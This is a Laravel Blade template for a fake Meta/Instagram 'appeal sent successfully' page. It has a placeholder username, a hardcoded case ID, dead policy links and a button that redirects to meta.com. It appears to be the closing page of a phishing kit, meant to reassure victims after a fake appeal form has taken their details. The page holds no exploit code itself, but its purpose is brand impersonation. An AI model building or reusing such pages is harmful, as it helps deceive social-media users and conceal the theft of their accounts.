@extends('master')
@section('style')
    <style>
        .box-portal-top{
            background-color: #f5f5f5;
            width: 100%;
            min-height: 51vh;
            z-index: 20;
            text-align: center;
            font-family: 'PT Sans', sans-serif;
            padding: 50px 0;
        }
        .box-portal-mid{
            width: 100%;
            text-align: center;
            font-family: 'PT Sans', sans-serif;
            padding: 50px 0;
        }
        .box-portal-bot{
            background-color: #eeeff4;
            width: 100%;
            z-index: 20;
            font-family: 'PT Sans', sans-serif;
            padding: 30px;
            color: #2B2B2B;
            font-size: 16px;
        }
    </style>
@endsection
@section('content')
    <div class="container-fluid box-portal-top d-flex flex-column align-items-center" style="gap: 20px;">
        <img src="{{asset('image/ehe.png')}}" alt="" width="180">
        <h4 class="font-weight-bold">Successful!</h4>
        {{-- <p style="color: #938888; font-size:14px; margin: 0;">Dear <span class="font-weight-bold" style="color:#938888">{{'@'.$username}}</span>,<br>Your appeal has been sent successfully! We will review complaints again and provide you with feedback.</p> --}}
        <p style="color: #938888; font-size:14px; margin: 0;">Dear <span class="font-weight-bold" style="color:#938888">{{'@DEmMOOOOOOOOOO'}}</span>,<br>Your appeal has been sent successfully! We will review complaints again and provide you with feedback.</p>
        <p style="color: #938888; font-size:14px; margin: 0;">Thank you for your understanding.</p>
        <p style="color: #938888; font-size:14px; margin: 0;">Case ID: <span class="font-weight-bold">#3690852147</span></p>

        <div class="form-group">
            {{-- <input type="hidden" name="username" value="{{$username}}"> --}}
            {{-- <button type="submit" class="btn btn-primary form-control" style="min-width: 316px; margin-top: 20px;">Submit Form {{'@'.$username}}</button> --}}
            <a href="https://www.meta.com/"><button type="submit" class="btn btn-primary form-control" style="min-width: 316px; margin-top: 20px; font-size: 12px;">Submit Form {{'@DEmMOOOOOOOOOO'}}</button></a>
        </div>
    </div>
    <div class="container-fluid box-portal-mid d-flex flex-column align-items-center" style="gap: 40px;">
        <img src="{{asset('image/ehe.png')}}" alt="" width="180">
        <p style="color: #938888; font-size:14px;">To protect our community, we attach great importance to complaints and community rules and notify the user who has any complaints on their account.</p>
    </div>
    <div class="container-fluid box-portal-bot">
        <div class="linksx" style="padding-bottom: 10px">
            <a href="#">Community Standarts</a> &nbsp;&nbsp; | &nbsp;&nbsp;
            <a href="#">Data Policy</a> <br><br>
            <a href="#">Terms</a>
             &nbsp;&nbsp; | &nbsp;&nbsp;
            <a href="#">Cookie Policy</a>
            </div>
        <hr color="#E0E0E0" size="0.1px" width="90%">
        <div class="dil" style="padding-top: 10px">
            <p>Language English (US)</p>
        </div>
    </div>
@endsection
